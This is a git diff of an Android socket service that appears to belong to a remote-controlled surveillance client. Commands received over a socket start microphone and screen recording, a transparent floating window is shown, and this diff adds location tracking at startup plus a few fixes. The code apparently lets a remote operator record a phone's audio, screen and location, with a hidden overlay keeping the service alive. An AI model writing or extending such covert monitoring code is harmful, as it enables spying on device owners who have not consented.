@@ -8,23 +8,15 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.graphics.Color;
-import android.graphics.PixelFormat;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.RemoteException;
-import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.util.Log;
-import android.view.Gravity;
-import android.view.LayoutInflater;
-import android.view.View;
-import android.view.WindowManager;
-import android.widget.Button;
 import android.widget.Toast;
 
-import com.imuxuan.floatingview.FloatingView;
 import com.view.core.MyApplication;
 import com.view.core.activitys.MainActivity;
 import com.view.core.activitys.PhoneRecordActivity;
@@ -33,6 +25,7 @@ import com.view.core.thread.ClientThread;
 import com.view.core.thread.Constant;
 import com.view.core.thread.OnClientListener;
 import com.view.core.utils.FloatViewUtil;
+import com.view.core.utils.LocationUtil;
 
 import Android.view.core.R;
 
@@ -60,6 +53,7 @@ public class SocketService extends Service {
         super.onCreate();
         Log.d(TAG, "onCreate: executed "+ PID);
         mContext = this;
+        LocationUtil.getInstance().initLocationManager(mContext);
     }
 
     @NonNull
@@ -98,6 +92,7 @@ public class SocketService extends Service {
         if(mClientThread == null) {
             mClientThread = new ClientThread(this, mHandler, mListener);
             mClientThread.start();
+            MyApplication.setClientThread(mClientThread);
         }
         //显示透明浮窗
         FloatViewUtil.getInstance().showFloatingWindow(mContext);
@@ -112,6 +107,7 @@ public class SocketService extends Service {
             mClientThread.isStopThread = true;
             mClientThread.interrupt();
             mClientThread = null;
+            MyApplication.setClientThread(null);
         }
     }
 
@@ -167,6 +163,7 @@ public class SocketService extends Service {
                  * 开启录音
                  */
             }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_PHONE)){
+                Log.d(TAG, "onCommand: start phone record");
                 Intent intent = new Intent();
                 intent.setClass(mContext, PhoneRecordActivity.class);
                 intent.setPackage(getPackageName());
@@ -176,7 +173,7 @@ public class SocketService extends Service {
                 intent.putExtra("data", bundle);
                 startActivity(intent);
             }else if(cmd.equals(Constant.CMD_STOP_REMOTE_PHONE)){
-                            PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection = ((MyApplication)getApplication()).getPhoneServiceConnection();
+                PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection = ((MyApplication)getApplication()).getPhoneServiceConnection();
                 if(mPhoneServiceConnection != null){
                     Log.d(TAG, "onCommand: unbindservice");
                     try {
@@ -188,7 +185,9 @@ public class SocketService extends Service {
                                 }
                             });
                         }
-                        mPhoneServiceConnection.record.stopRecord();
+                        if(mPhoneServiceConnection.record != null) {
+                            mPhoneServiceConnection.record.stopRecord();
+                        }
                     } catch (RemoteException e) {
                         e.printStackTrace();
                     }
@@ -197,6 +196,7 @@ public class SocketService extends Service {
                  * 开启录屏
                  */
             }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_SCREEN)){
+                Log.d(TAG, "onCommand: start screen record");
                 Intent intent = new Intent();
                 intent.setClass(mContext, ScreenRecordActivity.class);
                 intent.setPackage(getPackageName());
